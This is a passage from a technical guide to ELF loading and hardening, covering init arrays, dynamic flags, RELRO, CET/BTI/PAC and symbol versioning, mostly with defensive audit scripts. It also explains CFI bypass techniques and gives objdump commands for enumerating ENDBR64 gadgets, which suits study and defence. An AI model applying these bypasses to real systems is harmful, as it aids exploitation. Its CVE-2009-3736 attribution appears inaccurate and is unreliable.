#   const char  *dlpi_name;
#   const ElfW(Phdr) *dlpi_phdr;
#   ElfW(Half)   dlpi_phnum;

PT_DYNAMIC = 2
DT_INIT_ARRAY = 25
DT_INIT_ARRAYSZ = 27
DT_NULL = 0

def read_ptr(addr):
    """Read a 64-bit pointer from process memory."""
    return ctypes.c_uint64.from_address(addr).value

def callback(info_ptr, size, data):
    """dl_iterate_phdr callback: find PT_DYNAMIC, parse DT_INIT_ARRAY."""
    dlpi_addr = ctypes.c_uint64.from_address(info_ptr).value
    dlpi_name_ptr = ctypes.c_uint64.from_address(info_ptr + 8).value
    dlpi_phdr = ctypes.c_uint64.from_address(info_ptr + 16).value
    dlpi_phnum = ctypes.c_uint16.from_address(info_ptr + 24).value

    name = ctypes.string_at(dlpi_name_ptr).decode() if dlpi_name_ptr else "<main>"

    # Walk program headers to find PT_DYNAMIC
    phdr_size = 56  # sizeof(Elf64_Phdr)
    for i in range(dlpi_phnum):
        p_type = ctypes.c_uint32.from_address(dlpi_phdr + i * phdr_size).value
        if p_type == PT_DYNAMIC:
            p_vaddr = ctypes.c_uint64.from_address(
                dlpi_phdr + i * phdr_size + 16).value
            dyn_addr = dlpi_addr + p_vaddr
            # Walk .dynamic entries
            init_array_addr = 0
            init_array_sz = 0
            offset = 0
            while True:
                d_tag = ctypes.c_int64.from_address(dyn_addr + offset).value
                d_val = ctypes.c_uint64.from_address(dyn_addr + offset + 8).value
                if d_tag == DT_NULL:
                    break
                if d_tag == DT_INIT_ARRAY:
                    init_array_addr = dlpi_addr + d_val
                elif d_tag == DT_INIT_ARRAYSZ:
                    init_array_sz = d_val
                offset += 16

            if init_array_addr and init_array_sz:
                n_entries = init_array_sz // 8
                print(f"[{name}] .init_array at {init_array_addr:#x}, "
                      f"{n_entries} entries:")
                for j in range(n_entries):
                    fn_ptr = read_ptr(init_array_addr + j * 8)
                    print(f"  [{j}] {fn_ptr:#x}")
            break
    return 0

cb = PHDR_CALLBACK(callback)
libc.dl_iterate_phdr(cb, None)
```

Unexpected constructor addresses — those not mapping to known code sections of the expected DSO — are a strong indicator of binary patching, code injection, or supply-chain compromise. Cross-reference each address against `/proc/self/maps` to verify it falls within the `.text` range of the declaring DSO.

---

## 4. `DT_FLAGS` and `DT_FLAGS_1` in detail

Chapter 1A introduced these tags. Here is the complete set of flags a security reviewer should know:

### 4.1 `DT_FLAGS`

- `DF_ORIGIN` (0x1) — the object references `$ORIGIN` in its `DT_RPATH`/`DT_RUNPATH`, which the loader resolves to the directory containing the object. `$ORIGIN`-based rpaths are a convenience for relocatable installations but a historical source of privilege-escalation bugs when the origin directory is attacker-controllable (if a setuid binary with `DT_RUNPATH = $ORIGIN/../lib` is hard-linked or symlinked into a directory where the attacker can plant a malicious `lib/` peer, the rpath resolves to the attacker's library). The linker emits `DF_ORIGIN` to tell the loader it needs to compute `$ORIGIN`; the loader checks `AT_SECURE` and ignores `$ORIGIN` in rpath under elevated privilege contexts since glibc 2.12.
- `DF_SYMBOLIC` (0x2) — the object's own definitions are preferred over the global scope. Prevents `LD_PRELOAD` interposition of symbols this DSO defines and calls internally. Same practical effect as compiling with `-Bsymbolic`. Side effect: breaks certain C++ ODR patterns that rely on cross-DSO deduplication.
- `DF_TEXTREL` (0x4) — the object has relocations against text (read-only) segments. Forces the loader to `mprotect` the text segment writable, apply relocations, and `mprotect` back. A performance and security smell. Modern toolchains default to `-z text` which makes this a link error; the flag's presence in a modern binary is anomalous. SELinux's `deny_execmod` policy blocks `PROT_WRITE` on `MAP_PRIVATE` executable mappings, which prevents `DT_TEXTREL` binaries from loading under that policy.
- `DF_BIND_NOW` (0x8) — resolve all symbols at load time (disable lazy binding). See Chapter 1A §11.4.
- `DF_STATIC_TLS` (0x10) — see §1.3 above.

### 4.2 `DT_FLAGS_1`

- `DF_1_NOW` (0x1) — same as `DF_BIND_NOW`; redundant but both are checked.
- `DF_1_GLOBAL` (0x2) — add the object's symbols to the global scope even if it was `dlopen`'d with `RTLD_LOCAL`. Used by `libpthread` and similar.
- `DF_1_GROUP` (0x4) — the object is a member of a group; its symbols are searched within its dependency group.
- `DF_1_NODELETE` (0x8) — the object cannot be unloaded via `dlclose`. Ensures its destructors never run and its memory mappings persist. Used by threading libraries.
- `DF_1_LOADFLTR` (0x10) — the object should be loaded immediately (not lazily) even if it appears as a filter. Related to auxiliary and filter library features.
- `DF_1_INITFIRST` (0x20) — run this object's constructors before all others (except `DT_PREINIT_ARRAY`). Used by `libpthread` historically.
- `DF_1_NOOPEN` (0x40) — the object cannot be `dlopen`'d. Can only be loaded as a regular dependency. Used to prevent programmatic loading of sensitive internal libraries.
- `DF_1_ORIGIN` (0x80) — same effect as `DF_ORIGIN`.
- `DF_1_DIRECT` (0x100) — direct binding (Solaris concept; weakly supported on Linux).
- `DF_1_INTERPOSE` (0x400) — the object's symbols interpose over all others. Stronger than load-order-based interposition: the interposer's definitions win even against earlier-loaded objects. Dangerous; must be used with care.
- `DF_1_NODEFLIB` (0x800) — ignore default library search paths.
- `DF_1_NODUMP` (0x1000) — the object cannot be dumped (e.g., by `dldump`).
- `DF_1_CONFALT` (0x2000) — configuration alternative.
- `DF_1_ENDFILTEE` (0x4000) — end of filter chain.
- `DF_1_DISPRELDNE` (0x8000), `DF_1_DISPRELPND` (0x10000) — displacement relocations done/pending.
- `DF_1_NODIRECT` (0x20000) — do not allow direct binding to this object.
- `DF_1_PIE` (0x8000000) — this `ET_DYN` is a position-independent executable, not a shared library. This is the canonical way to distinguish PIE from DSO when `e_type` alone is ambiguous.

A static-analysis hardening check for ELF should, at minimum, report: `DF_BIND_NOW` or `DF_1_NOW` present (full lazy-binding disabled), `DF_TEXTREL` absent (no text relocations), `DF_1_PIE` present if the binary is an executable, and `DF_STATIC_TLS` absent if the object is intended for `dlopen` use.

---

## 5. Security segments

### 5.1 `PT_GNU_RELRO`

RELRO — RELocation Read-Only — is the mechanism that, after the dynamic linker finishes relocating, `mprotect`s writable data-segment regions back to read-only. A `PT_GNU_RELRO` program header names the virtual-address range to protect.

The linker groups relocation targets that won't need further writes — `.dynamic`, `.got`, `.init_array`, `.fini_array`, and other metadata tables — into a contiguous region at the beginning of the data segment, and emits a `PT_GNU_RELRO` covering them. After the dynamic linker processes all startup relocations, it calls `_dl_protect_relro`, which `mprotect`s the RELRO region with `PROT_READ`.

**Partial RELRO** (the default with `-z relro` alone): `.dynamic`, `.got`, `.init_array`, `.fini_array` and similar metadata are RELRO-protected, but `.got.plt` is excluded because lazy binding needs to write to it. This protects metadata tables but leaves the PLT's GOT writable — the classic GOT-overwrite target.

**Full RELRO** (`-z relro -z now`): `DF_BIND_NOW`/`DF_1_NOW` forces eager resolution of all PLT entries at startup, and `.got.plt` is merged into the RELRO region. After load, the entire GOT is read-only. The PLT still exists (the `jmp *[GOT]` stubs), but the GOT entries they read are immutable. This closes the GOT-overwrite primitive.

Full RELRO is nearly universal in modern Linux distributions for system binaries. The startup cost of resolving all symbols eagerly is usually small (a few milliseconds) and paid once. For defense: mandate full RELRO in your build system for all C/C++ deliverables. Verification: `readelf -l binary | grep GNU_RELRO` confirms the segment exists; `readelf -d binary | grep -E '(BIND_NOW|FLAGS)'` confirms `BIND_NOW`.

### 5.2 `PT_GNU_STACK`

Controls the executability of the process's main stack. If a `PT_GNU_STACK` program header exists with `p_flags` excluding `PF_X`, the kernel allocates the stack non-executable. If the flag includes `PF_X`, or if no `PT_GNU_STACK` segment exists at all, the kernel defaults to an executable stack on some architectures (x86, historical) or non-executable on others (x86_64, AArch64, where the hardware default is NX).

A binary requesting an executable stack on x86_64 is almost always wrong. The typical cause is assembly-language source files lacking a `.section .note.GNU-stack,"",@progbits` directive — without it, the assembler marks the object as "unknown stack requirement," and the linker conservatively sets `PF_X`. A single such object in a link pulls the entire executable to executable-stack.

Detection: `readelf -l binary | grep GNU_STACK` and inspect the flags. `RW` (no `E`) is correct; `RWE` is anomalous. `execstack -q binary` is a convenience wrapper.

SELinux can enforce NX stack regardless of the binary's `PT_GNU_STACK` via the `execstack` boolean and the `allow_execstack` permission.

### 5.3 `PT_GNU_PROPERTY` and hardware-backed CFI

`PT_GNU_PROPERTY` wraps a `.note.gnu.property` section containing `NT_GNU_PROPERTY_TYPE_0` notes. These notes carry property entries — small TLV structures describing hardware-security feature requirements.

On x86_64, the relevant property is `GNU_PROPERTY_X86_FEATURE_1_AND`:

- Bit 0: `GNU_PROPERTY_X86_FEATURE_1_IBT` — the binary is compiled with Intel Indirect Branch Tracking. Every valid indirect-branch target begins with an `ENDBR64` instruction; indirect branches landing elsewhere trigger a `#CP` fault. The property note tells the loader to enable CET-IBT for this process if the hardware supports it.
- Bit 1: `GNU_PROPERTY_X86_FEATURE_1_SHSTK` — the binary is compiled for CET Shadow Stack. Call instructions push return addresses onto both the normal stack and a hardware-managed shadow stack; `ret` instructions compare both and fault on mismatch. Prevents ROP by making return addresses effectively immutable.

On AArch64, the analogous properties are `GNU_PROPERTY_AARCH64_FEATURE_1_BTI` (Branch Target Identification — the ARM equivalent of IBT; valid targets start with `BTI` instructions) and `GNU_PROPERTY_AARCH64_FEATURE_1_PAC` (Pointer Authentication — return addresses are cryptographically signed by the `PACIA`/`AUTIA` instruction pair; forged return addresses fail authentication).

The dynamic linker (`ld.so`) reads `PT_GNU_PROPERTY` for every loaded object. On x86_64, CET-IBT and CET-SHSTK are enabled only if *all* loaded objects declare the respective property. A single legacy shared object lacking the IBT note disables IBT for the entire process. This is the "weakest link" deployment problem: a defender must ensure every DSO in the load chain is CET-compiled. `readelf -n binary | grep -i 'x86 feature'` reports the state.

On AArch64, BTI can be enforced per-page (the kernel's `mmap` flags support `PROT_BTI`), so a single non-BTI DSO does not necessarily disable BTI for the rest. PAC is always process-wide.

Detection: enumerate all loaded objects (from `r_debug` / `dl_iterate_phdr`), check each for `PT_GNU_PROPERTY` and the relevant bits. Report any objects that are the weakest link preventing CET/BTI/PAC activation.

### 5.4 CET Shadow Stack bypass techniques

CET Shadow Stack (SHSTK) maintains a hardware-protected copy of return addresses. On every `CALL`, the processor pushes the return address onto both the regular stack and the shadow stack. On `RET`, both are popped and compared; a mismatch triggers `#CP` (Control Protection exception). This effectively kills traditional ROP, which depends on overwriting return addresses on the regular stack.

The primary bypass avenue is **signal handler manipulation**. When the kernel delivers a signal, it must save and restore the shadow stack state. The `RSTORSSP` and `SAVEPREVSSP` instructions manage shadow stack switching. On older kernel versions (pre-6.6 for some edge cases), the signal frame restoration path was vulnerable: if an attacker could corrupt the signal frame's shadow-stack-pointer save area on the regular stack (which is writable), the `sigreturn` would restore a crafted shadow stack pointer, effectively pivoting the shadow stack to attacker-controlled memory. The attacker pre-populates this fake shadow stack with a ROP chain's return addresses, and subsequent `RET` instructions validate against the fake shadow stack — passing all checks.

Modern kernels mitigate this by using a separate shadow-stack-based token for signal frame validation. The `SAVEPREVSSP`/`RSTORSSP` pair creates a restore token on the shadow stack itself (which the attacker cannot write to without hardware permission), and `sigreturn` validates this token. However, this mitigation requires a sufficiently recent kernel, and compatibility with older userspace signal handling code is an ongoing deployment challenge.

### 5.5 IBT bypass: the ENDBR64 problem

Intel IBT (Indirect Branch Tracking) requires that every valid indirect-branch target begins with an `ENDBR64` (or `ENDBR32`) instruction. Indirect `JMP` or `CALL` to any other instruction triggers `#CP`.

The practical problem is that `ENDBR64` is ubiquitous. Every function that might be called indirectly — through function pointers, virtual tables, PLT stubs, callback arguments — is compiled with `ENDBR64` as its first instruction. In a typical large binary (glibc, libstdc++, a browser engine), there are thousands of `ENDBR64`-prefixed functions. An attacker constrained by IBT cannot jump to arbitrary gadgets, but can jump to any `ENDBR64`-prefixed function. This reduces the gadget catalog but does not eliminate it.

The ENDBR64-to-ENDBR64 chaining technique works as follows: the attacker's corrupted function pointer targets an `ENDBR64`-prefixed function that itself performs an indirect call through a register the attacker controls. For example, if the attacker controls `rdi` (the first argument) and targets a function like `qsort`'s comparator dispatch, the indirect call within `qsort` goes through the attacker-supplied comparator pointer — which must also be `ENDBR64`-prefixed, but the attacker has thousands to choose from. Each step in the chain launders control flow through a legitimate `ENDBR64` landing pad.

Finding ENDBR64 gadgets is trivial:

```bash
# Enumerate all ENDBR64 landing pads in a binary
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | \
    grep -c 'endbr64'
# Typical count: 5000–15000 in libc alone

# Find ENDBR64 functions that perform indirect calls (second-stage pivots)
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | \
    awk '/endbr64/{found=1; addr=$1} found && /call.*\*/{print addr, $0; found=0}'
```

The mitigation for ENDBR64's coarse granularity is **Fine-Grained CFI** — schemes like LLVM's CFI type checks, which restrict indirect calls not just to `ENDBR64` landing pads but to functions with matching type signatures. CET-IBT alone is a coarse-grained forward-edge CFI that raises the bar but does not prevent determined exploitation.

### 5.6 PAC bypass: signing oracles and collision attacks

ARM Pointer Authentication (PAC) signs pointers with a cryptographic MAC using a secret key, a modifier (typically the stack pointer or an address-diversity value), and the pointer itself. Forging a signed pointer requires knowing the key, which is held in system registers inaccessible to userspace.

Three bypass classes exist in the current literature. First, **signing oracles**: if the attacker can cause the target program to sign an arbitrary pointer value (e.g., by controlling the argument to a function that stores a PAC-signed pointer, or by exploiting a vulnerability in a function that calls `PACIA`), the attacker obtains a validly signed pointer without knowing the key. The `pacga` instruction, which computes a generic PAC (not tied to a specific key domain), has been used in some oracle constructions. Second, **PAC collision/brute-force**: the PAC field is small (typically 7–16 bits depending on the virtual address width and tagging configuration). On a 48-bit VA with TBI (Top-Byte Ignore), the PAC has 7 usable bits, yielding a 1-in-128 chance of guessing correctly. In a fork-based server (e.g., pre-fork Apache), each attempt crashes only the child process while the parent retains the same PAC keys, allowing brute-force across forks. Third, **pointer substitution**: if the attacker can find a legitimately signed pointer to a useful gadget (one that was signed with the same modifier/context as the target pointer slot), they can transplant it. This is the PAC analog of reuse-based attacks: the signed pointer is valid, just not for the purpose the program intended.

### 5.7 The weakest-link deployment problem and DSO audit

On x86_64, CET is an all-or-nothing property: if any loaded DSO lacks the `GNU_PROPERTY_X86_FEATURE_1_IBT` or `GNU_PROPERTY_X86_FEATURE_1_SHSTK` note, the kernel/loader disables that CET feature for the entire process. A single legacy library — a proprietary codec, an old JNI native library, a vendored dependency compiled with an older GCC — silently degrades the entire process's security posture.

The following script audits all loaded DSOs in a running process for CET/BTI/PAC support gaps:

```bash
#!/bin/bash
# cet_bti_audit.sh — audit all loaded DSOs for hardware-CFI support gaps.
# Usage: cet_bti_audit.sh <PID>
# Requires: readelf, /proc access.

PID="${1:?Usage: $0 <PID>}"
ARCH=$(file -L "/proc/$PID/exe" 2>/dev/null | grep -oP 'x86-64|aarch64')

echo "=== Hardware CFI audit for PID $PID (arch: ${ARCH:-unknown}) ==="
echo ""

# Extract all mapped ELF objects from /proc/PID/maps
mapfile -t dsos < <(
    awk '$6 ~ /\.so|\/bin\/|\/sbin\/|\/libexec\// && !seen[$6]++ {print $6}' \
        "/proc/$PID/maps" 2>/dev/null
)

TOTAL=0
MISSING_IBT=0
MISSING_SHSTK=0
MISSING_BTI=0
MISSING_PAC=0

for dso in "${dsos[@]}"; do
    [ -f "$dso" ] || continue
    TOTAL=$((TOTAL + 1))

    props=$(readelf -n "$dso" 2>/dev/null)

    if [ "$ARCH" = "x86-64" ]; then
        has_ibt=$(echo "$props" | grep -ci 'IBT')
        has_shstk=$(echo "$props" | grep -ci 'SHSTK')
        if [ "$has_ibt" -eq 0 ]; then
            echo "MISSING IBT:   $dso"
            MISSING_IBT=$((MISSING_IBT + 1))
        fi
        if [ "$has_shstk" -eq 0 ]; then
            echo "MISSING SHSTK: $dso"
            MISSING_SHSTK=$((MISSING_SHSTK + 1))
        fi
    elif [ "$ARCH" = "aarch64" ]; then
        has_bti=$(echo "$props" | grep -ci 'BTI')
        has_pac=$(echo "$props" | grep -ci 'PAC')
        if [ "$has_bti" -eq 0 ]; then
            echo "MISSING BTI:   $dso"
            MISSING_BTI=$((MISSING_BTI + 1))
        fi
        if [ "$has_pac" -eq 0 ]; then
            echo "MISSING PAC:   $dso"
            MISSING_PAC=$((MISSING_PAC + 1))
        fi
    fi
done

echo ""
echo "=== Summary ==="
echo "Total DSOs inspected: $TOTAL"
if [ "$ARCH" = "x86-64" ]; then
    echo "Missing IBT:   $MISSING_IBT / $TOTAL"
    echo "Missing SHSTK: $MISSING_SHSTK / $TOTAL"
    [ "$MISSING_IBT" -gt 0 ] || [ "$MISSING_SHSTK" -gt 0 ] && \
        echo "WARNING: CET is likely DISABLED for this process due to missing DSOs."
elif [ "$ARCH" = "aarch64" ]; then
    echo "Missing BTI:   $MISSING_BTI / $TOTAL"
    echo "Missing PAC:   $MISSING_PAC / $TOTAL"
fi
```

---

## 6. `.eh_frame` and `.eh_frame_hdr` — DWARF-based stack unwinding

### 6.1 Purpose and context

Stack unwinding — the process of walking up the call chain from the current frame to the outermost caller — is needed for C++ exception dispatch (`throw` → `catch`), for debugger backtrace (`bt`), for profiler stack sampling, and for crash reporters. On x86_64, where frame pointers are optional (and often omitted with `-fomit-frame-pointer`, the default), the unwinder needs side-channel metadata to reconstruct each frame. That metadata lives in `.eh_frame`.

### 6.2 `.eh_frame` structure

`.eh_frame` is a sequence of Common Information Entries (CIEs) and Frame Description Entries (FDEs), encoded in a variant of the DWARF Call Frame Information (CFI) format.

A **CIE** describes unwinding rules common to a set of functions: the return-address register, the default CFA (Canonical Frame Address) rule, the personality routine (for language-specific exception handling), and the data alignment factors (code and data alignment, used to compact the table). Multiple FDEs can reference the same CIE.

An **FDE** describes one function (or one contiguous code region). It specifies a `pc_begin` (start address of the code region), `pc_range` (length), an optional LSDA (Language-Specific Data Area, pointed to by the augmentation string), and a sequence of **DWARF CFI instructions** that describe how the CFA and each saved register evolve as the PC advances through the function.

The CFI instructions are compact bytecoded operations: `DW_CFA_advance_loc` (move the PC cursor), `DW_CFA_def_cfa` (define CFA as `register + offset`), `DW_CFA_offset` (register is saved at CFA + offset), `DW_CFA_restore`, and others. They are a mini-program that, when replayed up to the faulting PC, tell the unwinder where each callee-saved register was pushed and what the stack pointer adjustment was.

The **augmentation string** in the CIE controls additional per-FDE data. The `'z'` augmentation enables a length-prefixed augmentation data block. `'P'` indicates a personality-routine pointer (for C++, this is `__gxx_personality_v0`; for Rust, `rust_eh_personality`). `'L'` indicates an LSDA pointer encoding. `'R'` indicates the FDE address encoding (`DW_EH_PE_absptr`, `DW_EH_PE_pcrel`, `DW_EH_PE_sdata4`, etc.).

### 6.3 `.eh_frame_hdr`

Linear scanning of `.eh_frame` is slow; `.eh_frame_hdr` is a binary-search index. It begins with a header (`version`, `eh_frame_ptr_enc`, `fde_count_enc`, `table_enc`, `eh_frame_ptr`, `fde_count`), followed by a sorted array of `{initial_location, fde_address}` pairs. Given a PC, the unwinder binary-searches this table to find the FDE covering that PC, then reads the FDE's CFI instructions.

The `PT_GNU_EH_FRAME` program header points the dynamic linker at `.eh_frame_hdr`, so the runtime unwind library (`libgcc_s.so.1` or equivalent) can locate it without consulting section headers.

### 6.4 Security relevance

`.eh_frame` is normally in a read-only segment (it is `SHF_ALLOC` but not `SHF_WRITE`). However:

The personality routine pointer in the CIE is an indirect call target: when the unwinder dispatches a C++ exception, it calls the personality routine through this pointer. If `.eh_frame` were writable (or if an attacker could corrupt the in-memory copy), redirecting the personality routine pointer is a code-execution primitive triggered by any thrown exception. Full RELRO and read-only `.eh_frame` close this.

On some older kernels/toolchains, `.eh_frame` for `dlopen`'d objects is registered with the runtime unwinder via `__register_frame_info`, which involves writing to a global linked list. A race condition during concurrent `dlopen`/`dlclose` in multithreaded programs has historically led to use-after-free bugs in the unwind tables themselves — a source of both reliability and (occasionally) security issues.

DWARF CFI expressions (`DW_CFA_def_cfa_expression`, `DW_CFA_val_expression`) are Turing-incomplete but can encode complex computations; fuzzing the CFI interpreter in `libgcc_s` / `libunwind` against crafted `.eh_frame` sections has produced crash bugs.

### 6.5 Personality routine pointer corruption

The CIE's personality routine pointer (the `'P'` augmentation entry) is an indirect call target invoked by the C++ exception-handling unwinder (`_Unwind_RaiseException` in libgcc or LLVM's libunwind). When an exception is thrown, the unwinder walks the call stack via `.eh_frame` FDEs, and for each frame, calls the personality routine (`__gxx_personality_v0` for C++, `__gcc_personality_v0` for C with cleanup) to determine whether the frame has a matching catch block.

If an attacker can corrupt the personality routine pointer in an in-memory CIE — through a write primitive that reaches the `.eh_frame` mapping, or by corrupting the `PT_GNU_EH_FRAME` pointer in a writable program header copy — the next thrown exception triggers a call to the attacker's address. The conditions required are specific: `.eh_frame` must be writable (which it normally is not — it resides in a read-only `PT_LOAD` segment), and the program must throw a C++ exception through the corrupted frame. In programs that catch and rethrow exceptions routinely (Java/JNI, Python/C++ extensions, complex C++ services), the exception-throw trigger is reliable.

Historical instances include CVE-2009-3736 (ltdl), where confusion between `dlopen`'d module unwind data and the host process's CIEs led to use-after-free in the personality dispatch path, and several libgcc_s fuzzing findings where malformed CIE augmentation data caused the unwinder to read a personality pointer from an unintended offset.

### 6.6 DWARF expression exploitation

DWARF CFI supports expression-based rules via `DW_CFA_def_cfa_expression` and `DW_CFA_val_expression`. These embed DWARF expression opcodes — a stack-based bytecode that supports memory reads (`DW_OP_deref`), arithmetic (`DW_OP_plus`, `DW_OP_mul`), and register reads (`DW_OP_breg0` through `DW_OP_breg31`). Although the expression language lacks loops (it is Turing-incomplete), it can perform arbitrary memory reads and arithmetic computations.

A crafted `.eh_frame` with malicious DWARF expressions can cause the unwinder to read from arbitrary addresses during stack unwinding. If the unwinder runs in a context where the read results influence control flow (e.g., computing the CFA or a saved register value that is subsequently used as a return address), the attacker achieves a controlled read-to-control-flow primitive.

The attack surface is realistic in scenarios where an attacker can supply or modify `.eh_frame` content: corrupted ELF files loaded via `dlopen`, binary-patching attacks, or shared-memory-based code injection. The `libgcc_s` DWARF expression evaluator has been fuzzed extensively since the mid-2010s, but the complexity of the expression language and the interaction with per-architecture register numbering means new parsing bugs continue to surface.

### 6.7 `.eh_frame` as a source of ROP gadgets

The `.eh_frame` section is mapped into the process's address space (it has `SHF_ALLOC`) and is typically in an executable-adjacent read-only segment. Although not itself executable, on binaries compiled without CET-IBT, the unwinder's *interpretation* of DWARF bytecode constitutes a form of weird-machine execution — the attacker supplies data that drives complex computation in the unwinder's code.

More directly, the bytes of `.eh_frame` FDE entries contain sequences that, if treated as x86_64 instructions, look like useful gadgets. The DWARF bytecode `DW_CFA_advance_loc` encodings contain multi-byte sequences that happen to encode `ret`, `pop rdi; ret`, and similar fragments when the instruction pointer lands on them mid-stream. On binaries where `.eh_frame` is in an executable segment (some older or misconfigured toolchains), these become directly usable ROP gadgets. On properly configured binaries (`.eh_frame` in a non-executable segment), this is a non-issue.

The practical takeaway for defenders is to verify that `.eh_frame` is not in an executable segment:

```bash
# Check if .eh_frame is in an executable segment
readelf -S --wide /path/to/binary | grep eh_frame
readelf -l --wide /path/to/binary | grep -A1 'LOAD.*R.E'
# If the .eh_frame offset falls within an R-E LOAD segment, it is executable —
# a misconfiguration that should be fixed at build time.
```

---

## 7. `.gnu_debuglink`, `.gnu.build-id`, and `.note.ABI-tag`

### 7.1 `.gnu_debuglink`

A stripped binary may retain a `.gnu_debuglink` section containing the filename and CRC-32 of its detached debug information. Tools like GDB search for the file in a set of conventional locations (`/usr/lib/debug/.build-id/xx/yyy.debug`, the binary's directory, `/usr/lib/debug/<binary-path>`).

The CRC-32 is a weak integrity check — it prevents mismatches from version skew but is trivially forgeable. Trust in debuginfo should rely on the build-ID mechanism instead.

### 7.2 `.gnu.build-id` / `.note.gnu.build-id`

A `PT_NOTE` / `.note.gnu.build-id` section carrying `NT_GNU_BUILD_ID`. The most common build-ID form is a SHA-1 hash (20 bytes) of the binary's content, injected by the linker (`-Wl,--build-id=sha1`). The first two hex digits form a directory name; the remainder is the file name under `/usr/lib/debug/.build-id/`.

The build-ID is the canonical key for matching a binary to its debuginfo, symbol files, and source. It is:

- Reproducible (same inputs produce the same build-ID, with reproducible builds enabled).
- Unique per build (any code change, any library change, any linker-flag change produces a different ID).
- Accessible at runtime: `dl_iterate_phdr` can walk all loaded objects' notes, extracting build-IDs. Crash reporters (e.g., `google-breakpad`, `sentry-native`) use this to match crash dumps to symbol servers.

A binary without a build-ID is harder to match to symbols after the fact. Modern distributions mandate build-IDs; their absence in a user-supplied binary is a minor quality flag.

### 7.3 `.note.ABI-tag`

`NT_GNU_ABI_TAG` carries the minimum kernel version the binary requires (OS = GNU/Linux, version triple e.g. 3.2.0). `ld.so` can check this at startup and refuse to run the binary on a too-old kernel. In practice, this check is rarely the binding constraint (the binary usually fails earlier due to missing kernel features or libc symbols). The note's main utility is as a build-provenance artifact — it records what kernel version the toolchain assumed.

---

## 8. Compressed debug sections

Debug information (`.debug_info`, `.debug_abbrev`, `.debug_line`, `.debug_str`, `.debug_ranges`, `.debug_loc`, etc.) can be enormous — frequently larger than the code itself. Two compression schemes exist:

### 8.1 `.zdebug` sections (legacy)

An older convention: the section is renamed from `.debug_*` to `.zdebug_*`, and the content is zlib-compressed with a 12-byte header (`ZLIB` magic followed by 8-byte uncompressed size in big-endian). Tools that don't understand `.zdebug` ignore it; tools that do decompress on the fly.

### 8.2 `SHF_COMPRESSED` (modern, standard)

The ELF standard compression flag: the section keeps its original name (`.debug_info`, etc.), `sh_flags` includes `SHF_COMPRESSED`, and the section body begins with an `Elf64_Chdr`:

```c
typedef struct {
    Elf64_Word  ch_type;       /* ELFCOMPRESS_ZLIB (1), ELFCOMPRESS_ZSTD (2) */
    Elf64_Word  ch_reserved;
    Elf64_Xword ch_size;       /* uncompressed size */
    Elf64_Xword ch_addralign;  /* uncompressed alignment */
} Elf64_Chdr;
```

`ELFCOMPRESS_ZSTD` is a recent addition, offering substantially faster decompression than zlib at comparable ratios. Toolchains are moving to it; binutils 2.40+ and LLVM 15+ support it.

Compressed sections never have `SHF_ALLOC` (they are not loaded into memory at runtime) and are purely a size optimization for on-disk debuginfo.

---

## 9. Symbol versioning

### 9.1 The problem

Libraries evolve: functions change signatures, behaviors, or ABIs. A program compiled against glibc 2.17 calling `memcpy` should get the glibc 2.17 behavior of `memcpy` even when run on a glibc 2.34 system that has changed `memcpy`'s implementation. Symbol versioning provides this.

### 9.2 The mechanism

Three sections participate:

**`.gnu.version` (SHT_GNU_versym).** A parallel array to `.dynsym`, one `Elf64_Half` per symbol. Each entry is a version index:

- 0 (`VER_NDX_LOCAL`): the symbol is local to this DSO and not exported for versioned resolution.
- 1 (`VER_NDX_GLOBAL`): the symbol is unversioned (the base version).
- 2+: the symbol belongs to the version definition or requirement with that index.

**`.gnu.version_d` (SHT_GNU_verdef).** Version definitions: versions this DSO *provides*. Each `Elf64_Verdef` entry declares a version name and its predecessors (versions it inherits from). For example, glibc's `libc.so.6` defines `GLIBC_2.2.5`, `GLIBC_2.3`, `GLIBC_2.3.2`, ..., `GLIBC_2.38`, each inheriting from the previous.

```c
typedef struct {
    Elf64_Half vd_version;     /* VER_DEF_CURRENT (1) */
    Elf64_Half vd_flags;       /* VER_FLG_BASE (this is the base version) */
    Elf64_Half vd_ndx;         /* version index */
    Elf64_Half vd_cnt;         /* number of Verdaux entries */
    Elf64_Word vd_hash;        /* hash of the version name */
    Elf64_Word vd_aux;         /* offset to first Verdaux */
    Elf64_Word vd_next;        /* offset to next Verdef */
} Elf64_Verdef;

typedef struct {
    Elf64_Word vda_name;       /* offset into .dynstr for version name */
    Elf64_Word vda_next;       /* offset to next Verdaux (predecessor) */
} Elf64_Verdaux;
```

**`.gnu.version_r` (SHT_GNU_verneed).** Version requirements: versions this DSO *needs* from its dependencies. Each `Elf64_Verneed` entry names a DSO and lists the version tags it requires.

```c
typedef struct {
    Elf64_Half vn_version;
    Elf64_Half vn_cnt;
    Elf64_Word vn_file;        /* offset into .dynstr for DSO name */
    Elf64_Word vn_aux;         /* offset to first Vernaux */
    Elf64_Word vn_next;        /* offset to next Verneed */
} Elf64_Verneed;

typedef struct {
    Elf64_Word vna_hash;
    Elf64_Half vna_flags;
    Elf64_Half vna_other;      /* version index assigned to this requirement */
    Elf64_Word vna_name;       /* version name in .dynstr */
    Elf64_Word vna_next;
} Elf64_Vernaux;
```

### 9.3 Resolution with versioning

When the dynamic linker resolves a symbol reference, it consults the referencing symbol's `.gnu.version` entry to determine which version is required. It then walks the defining DSO's `.gnu.version_d` to find a matching version. If the required version is not found, resolution fails with a "version not found" error — even if the symbol name itself exists. This is the mechanism that produces errors like `version 'GLIBC_2.34' not found (required by ./binary)`.

Versioning also enables multiple implementations of the same symbol to coexist in the same DSO. glibc exports `memcpy@@GLIBC_2.14` (the default version, used by newly-linked binaries) and `memcpy@GLIBC_2.2.5` (the old version, used by binaries linked against older glibc). The `@@` in `readelf` output denotes the default version; `@` denotes a non-default (compat) version.

### 9.4 Security relevance

Version requirements provide a minimum-libc check: a binary linked against `GLIBC_2.34` won't load on a system with `GLIBC_2.31`. This prevents silent behavioral mismatches.

Symbol versioning also prevents a subtle class of interposition bugs: an `LD_PRELOAD` library exporting `memcpy` without a version annotation will only match unversioned references. References to `memcpy@GLIBC_2.14` will still resolve to glibc's implementation. This is a common source of confusion for both legitimate interposition (intentional preloads) and malicious interposition (implant libraries that want to hook specific functions).

### 9.5 Version mismatch exploitation

An attacker who can influence the library search path (via `DT_RUNPATH` manipulation, filesystem-level DSO replacement, or container misconfiguration — see Chapter 1A §14 for path-based attacks) can supply an older version of a shared library that exports an older, vulnerable version of a symbol. The version-resolution mechanism will match the reference to the older version if the older library's `.gnu.version_d` declares the exact version string the binary requires.

